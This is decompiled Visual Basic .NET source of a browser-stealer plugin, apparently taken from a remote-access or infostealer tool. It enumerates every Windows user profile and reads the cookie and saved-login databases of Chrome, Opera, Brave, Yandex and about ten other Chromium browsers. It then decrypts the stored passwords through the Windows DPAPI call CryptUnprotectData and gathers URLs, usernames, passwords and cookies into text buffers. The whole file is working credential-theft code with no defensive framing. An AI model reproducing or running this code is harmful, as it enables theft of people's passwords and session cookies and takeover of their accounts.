Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Plugin.Browsers.Chromium
	' Token: 0x02000014 RID: 20
	Public Class Chromium
		' Token: 0x0600008D RID: 141 RVA: 0x00006420 File Offset: 0x00004620
		Public Sub CookiesRecovery(Coocks As StringBuilder)
			Try
				For Each str As String In Me.GetAppDataFolders()
					Try
						Dim browser As String() = New String() { str + "\Local\Google\Chrome\User Data\Default\Cookies", str + "\Roaming\Opera Software\Opera Stable\Cookies", str + "\Local\Vivaldi\User Data\Default\Cookies", str + "\Local\Chromium\User Data\Default\Cookies", str + "\Local\Torch\User Data\Default\Cookies", str + "\Local\Comodo\Dragon\User Data\Default\Cookies", str + "\Local\Xpom\User Data\Default\Cookies", str + "\Local\Orbitum\User Data\Default\Cookies", str + "\Local\Kometa\User Data\Default\Cookies", str + "\Local\Amigo\User Data\Default\Cookies", str + "\Local\Nichrome\User Data\Default\Cookies", str + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies", str + "\Local\Yandex\YandexBrowser\User Data\Default\Cookies", str + "\Local\Blisk\User Data\Default\Cookies" }
						Dim selected As Integer = 0
						For Each b As String In browser
							Dim flag As Boolean = File.Exists(b)
							If flag Then
								Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(b)
								Try
									sqliteHandler.ReadTable("cookies")
								Catch
								End Try
								Select Case selected
									Case 0
										Coocks.Append(vbCr & "tf1" & ChrW(7) & "nsi" & vbLf & vbLf & "== Chrome ==========" & vbBack & "0" & vbLf)
									Case 1
										Coocks.Append(vbLf & "== Opera ===========" & vbLf)
									Case 2
										Coocks.Append(vbLf & "== Vivaldi ===========" & vbLf)
									Case 3
										Coocks.Append(vbLf & "== Chromium ===========" & vbLf)
									Case 4
										Coocks.Append(vbLf & "== Torch ===========" & vbLf)
									Case 5
										Coocks.Append(vbLf & "== Comodo ===========" & vbLf)
									Case 6
										Coocks.Append(vbLf & "== Xpom ===========" & vbLf)
									Case 7
										Coocks.Append(vbLf & "== Orbitum ===========" & vbLf)
									Case 8
										Coocks.Append(vbLf & "== Kometa ===========" & vbLf)
									Case 9
										Coocks.Append(vbLf & "== Amigo ===========" & vbLf)
									Case 10
										Coocks.Append(vbLf & "== Nichrome ===========" & vbLf)
									Case 11
										Coocks.Append(vbLf & "== Brave ===========" & vbLf)
									Case 12
										Coocks.Append(vbLf & "== Yandex ===========" & vbLf)
								End Select
								Dim ffcs As List(Of ChromiumCookies.ChromiumCookie) = ChromiumCookies.Cookies(b)
								For Each fcc As ChromiumCookies.ChromiumCookie In ffcs
									Coocks.Append(String.Concat(New String() { fcc.ToString(), vbLf & vbLf }))
								Next
								Coocks.Append(vbLf)
							End If
							selected += 1
						Next
					Catch ex As Exception
					End Try
				Next
			Catch
			End Try
		End Sub

		' Token: 0x0600008E RID: 142 RVA: 0x00006768 File Offset: 0x00004968
		Public Sub Recovery(Pass As StringBuilder)
			Try
				For Each str As String In Me.GetAppDataFolders()
					Try
						Dim browser As String() = New String() { str + "\Local\Google\Chrome\User Data\Default\Login Data", str + "\Roaming\Opera Software\Opera Stable\Login Data", str + "\Local\Vivaldi\User Data\Default\Login Data", str + "\Local\Chromium\User Data\Default\Login Data", str + "\Local\Torch\User Data\Default\Login Data", str + "\Local\Comodo\Dragon\User Data\Default\Login Data", str + "\Local\Xpom\User Data\Default\Login Data", str + "\Local\Orbitum\User Data\Default\Login Data", str + "\Local\Kometa\User Data\Default\Login Data", str + "\Local\Amigo\User Data\Default\Login Data", str + "\Local\Nichrome\User Data\Default\Login Data", str + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data", str + "\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data" }
						Dim selected As Integer = 0
						For Each b As String In browser
							Dim flag As Boolean = File.Exists(b)
							If flag Then
								Dim sqliteHandler As SQLiteHandler = New SQLiteHandler(b)
								Try
									sqliteHandler.ReadTable("logins")
								Catch
								End Try
								Select Case selected
									Case 0
										Pass.Append(vbLf & "== Chrome ==========" & vbLf)
									Case 1
										Pass.Append(vbLf & "== Opera ===========" & vbLf)
									Case 2
										Pass.Append(vbLf & "== Vivaldi ===========" & vbLf)
									Case 3
										Pass.Append(vbLf & "== Chromium ===========" & vbLf)
									Case 4
										Pass.Append(vbLf & "== Torch ===========" & vbLf)
									Case 5
										Pass.Append(vbLf & "== Comodo ===========" & vbLf)
									Case 6
										Pass.Append(vbLf & "== Xpom ===========" & vbLf)
									Case 7
										Pass.Append(vbLf & "== Orbitum ===========" & vbLf)
									Case 8
										Pass.Append(vbLf & "== Kometa ===========" & vbLf)
									Case 9
										Pass.Append(vbLf & "== Amigo ===========" & vbLf)
									Case 10
										Pass.Append(vbLf & "== Nichrome ===========" & vbLf)
									Case 11
										Pass.Append(vbLf & "== Brave ===========" & vbLf)
									Case 12
										Pass.Append(vbLf & "== Yandex ===========" & vbLf)
										Pass.Append("Not Work for now!" & vbLf)
								End Select
								For i As Integer = 0 To sqliteHandler.GetRowCount() - 1
									Dim value As String = sqliteHandler.GetValue(i, "origin_url")
									Dim value2 As String = sqliteHandler.GetValue(i, "username_value")
									Dim value3 As String = sqliteHandler.GetValue(i, "password_value")
									Dim text As String = String.Empty
									Dim flag2 As Boolean = Not String.IsNullOrEmpty(value3)
									If flag2 Then
										text = Me.Decrypt(Encoding.[Default].GetBytes(value3))
									Else
										text = ""
									End If
									Pass.Append(String.Concat(New String() { value, vbLf & "U: ", value2, vbLf & "P: ", text, vbLf & vbLf }))
								Next
							End If
							selected += 1
						Next
					Catch ex As Exception
					End Try
				Next
			Catch
			End Try
		End Sub

		' Token: 0x0600008F RID: 143 RVA: 0x00006AF8 File Offset: 0x00004CF8
		Private Function Decrypt(Datas As Byte()) As String
			Dim result As String
			Try
				Dim data_BLOB As Chromium.DATA_BLOB = Nothing
				Dim data_BLOB2 As Chromium.DATA_BLOB = Nothing
				Dim gchandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
				Dim data_BLOB3 As Chromium.DATA_BLOB
				data_BLOB3.pbData = gchandle.AddrOfPinnedObject()
				data_BLOB3.cbData = Datas.Length
				gchandle.Free()
				Dim cryptprotect_PROMPTSTRUCT As Chromium.CRYPTPROTECT_PROMPTSTRUCT = Nothing
				Dim empty As String = String.Empty
				Chromium.CryptUnprotectData(data_BLOB3, Nothing, data_BLOB2, CType(0, IntPtr), cryptprotect_PROMPTSTRUCT, CType(0, Chromium.CryptProtectFlags), data_BLOB)
				Dim array As Byte() = New Byte(data_BLOB.cbData + 1 - 1) {}
				Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData)
				Dim [string] As String = Encoding.UTF8.GetString(array)
				result = [string].Substring(0, [string].Length - 1)
			Catch
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x06000090 RID: 144 RVA: 0x00006BD0 File Offset: 0x00004DD0
		Private Function GetAppDataFolders() As String()
			Dim list As List(Of String) = New List(Of String)()
			Dim directories As String() = Directory.GetDirectories(Path.GetPathRoot(Environment.SystemDirectory) + "Users\", "*", SearchOption.TopDirectoryOnly)
			For i As Integer = 0 To directories.Length - 1
				Dim directoryInfo As DirectoryInfo = New DirectoryInfo(directories(i))
				list.Add(Path.GetPathRoot(Environment.SystemDirectory) + "Users\" + directoryInfo.Name + "\AppData")
			Next
			Return list.ToArray()
		End Function

		' Token: 0x06000091 RID: 145
		Private Declare Auto Function CryptProtectData Lib "Crypt32.dll" (ByRef pDataIn As Chromium.DATA_BLOB, szDataDescr As String, ByRef pOptionalEntropy As Chromium.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As Chromium.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As Chromium.CryptProtectFlags, ByRef pDataOut As Chromium.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x06000092 RID: 146
		Private Declare Auto Function CryptUnprotectData Lib "Crypt32.dll" (ByRef pDataIn As Chromium.DATA_BLOB, szDataDescr As StringBuilder, ByRef pOptionalEntropy As Chromium.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As Chromium.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As Chromium.CryptProtectFlags, ByRef pDataOut As Chromium.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x02000023 RID: 35
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure DATA_BLOB
			' Token: 0x04000060 RID: 96
			Public cbData As Integer

			' Token: 0x04000061 RID: 97
			Public pbData As IntPtr
		End Structure

		' Token: 0x02000024 RID: 36
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure CRYPTPROTECT_PROMPTSTRUCT
			' Token: 0x04000062 RID: 98
			Public cbSize As Integer

			' Token: 0x04000063 RID: 99
			Public dwPromptFlags As Chromium.CryptProtectPromptFlags

			' Token: 0x04000064 RID: 100
			Public hwndApp As IntPtr

			' Token: 0x04000065 RID: 101
			Public szPrompt As String
		End Structure

		' Token: 0x02000025 RID: 37
		<Flags()>
		Private Enum CryptProtectPromptFlags
			' Token: 0x04000067 RID: 103
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
			' Token: 0x04000068 RID: 104
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		End Enum

		' Token: 0x02000026 RID: 38
		<Flags()>
		Private Enum CryptProtectFlags
			' Token: 0x0400006A RID: 106
			CRYPTPROTECT_UI_FORBIDDEN = 1
			' Token: 0x0400006B RID: 107
			CRYPTPROTECT_LOCAL_MACHINE = 4
			' Token: 0x0400006C RID: 108
			CRYPTPROTECT_CRED_SYNC = 8
			' Token: 0x0400006D RID: 109
			CRYPTPROTECT_AUDIT = 16
			' Token: 0x0400006E RID: 110
			CRYPTPROTECT_NO_RECOVERY = 32
			' Token: 0x0400006F RID: 111
			CRYPTPROTECT_VERIFY_PROTECTION = 64
		End Enum
	End Class
End Namespace
